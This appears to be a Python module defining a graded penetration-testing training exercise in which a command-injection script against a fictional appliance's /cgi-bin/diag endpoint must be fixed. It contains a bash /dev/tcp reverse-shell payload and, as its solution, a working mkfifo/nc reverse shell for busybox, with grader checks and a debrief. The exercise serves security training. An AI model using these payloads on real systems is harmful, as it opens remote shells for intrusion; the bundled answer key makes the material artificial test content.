"""salvage defect class 7: the payload assumes a shell the target does not have.

The exploit is fine. The thing it delivers is written for a machine with bash
on it, and the target is an appliance with busybox. This is the difference
between the exploit being portable and the **payload** being portable, and it
is where a working command injection produces nothing at all.
"""

from __future__ import annotations

from ...model import SalvageBody, Scenario
from ...targets._hits import Requirement

BROKEN = r'''#!/usr/bin/env python3
# Wexler appliance - diagnostics command injection
import urllib.parse
import urllib.request
import urllib.error

TARGET = "{{URL}}"
LHOST = "127.0.0.1"
LPORT = "4444"

PAYLOAD = "bash -i >& /dev/tcp/" + LHOST + "/" + LPORT + " 0>&1"

def main():
    data = urllib.parse.urlencode({"host": "127.0.0.1",
                                   "cmd": PAYLOAD}).encode()
    req = urllib.request.Request(TARGET + "/cgi-bin/diag", data)
    try:
        body = urllib.request.urlopen(req).read().decode()
    except urllib.error.HTTPError as e:
        body = e.read().decode()
    print("[*] response: " + body)
    print("[+] landed" if "CRUX-LANDED" in body else "[-] no")

if __name__ == "__main__":
    main()
'''

SOLUTION = BROKEN.replace(
    'PAYLOAD = "bash -i >& /dev/tcp/" + LHOST + "/" + LPORT + " 0>&1"',
    'PAYLOAD = ("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|"\n'
    '           "nc " + LHOST + " " + LPORT + " >/tmp/f")')

SCENARIOS = [
    Scenario(
        id='salvage-portable', track='salvage', tier='verified', order=70,
        title='The injection works and nothing comes back',
        waypoint='shell-oneliners', hone=('bash', 'linuxutils'),
        source='PEN-200 Playbook/09 - Phase 7 - Lateral Movement, Pivoting & Shells.md',
        body=SalvageBody(
            brief='The diagnostics page on a Wexler appliance passes its '
                  '`cmd` parameter to a shell. **The appliance is busybox: '
                  '`/bin/sh` only, no bash, no python, and its `nc` has no '
                  '`-e`.** Your listener is on `127.0.0.1:4444`. The request '
                  'is accepted and no shell arrives.',
            filename='wexler_diag.py',
            defects=('bash-only redirection syntax', 'bash-only /dev/tcp'),
            route='/cgi-bin/diag',
            reject_code=200,
            reject_message='diagnostics queued',
            broken=BROKEN, solution=SOLUTION,
            requirements=(
                Requirement('the diagnostics endpoint', 'route',
                            '/cgi-bin/diag',
                            hint='nothing arrived at /cgi-bin/diag'),
                Requirement('a payload that runs under sh', 'form', '/bin/sh',
                            key='cmd',
                            hint='the payload never names a shell the target '
                                 'actually has'),
                Requirement('no /dev/tcp', 'body_absent', '%2Fdev%2Ftcp',
                            hint='the payload still uses /dev/tcp, which is a '
                                 'bash feature and does not exist in busybox '
                                 'sh'),
                Requirement('no bash', 'body_absent', 'bash',
                            hint='the payload still invokes bash, which is '
                                 'not installed on this target'),
            ),
            debrief='`>&` and `/dev/tcp/host/port` are **bash features**, not '
                    'shell features, and busybox has neither. The injection '
                    'succeeded every time: the appliance dutifully ran a '
                    'command that its shell could not parse. **Match the '
                    'payload to the target, not to your own machine.** The '
                    'portable answer when `nc` has no `-e` is the named pipe: '
                    '`mkfifo`, `cat` the pipe into `sh`, and pipe the output '
                    'back through `nc`.',
        ),
    ),
]
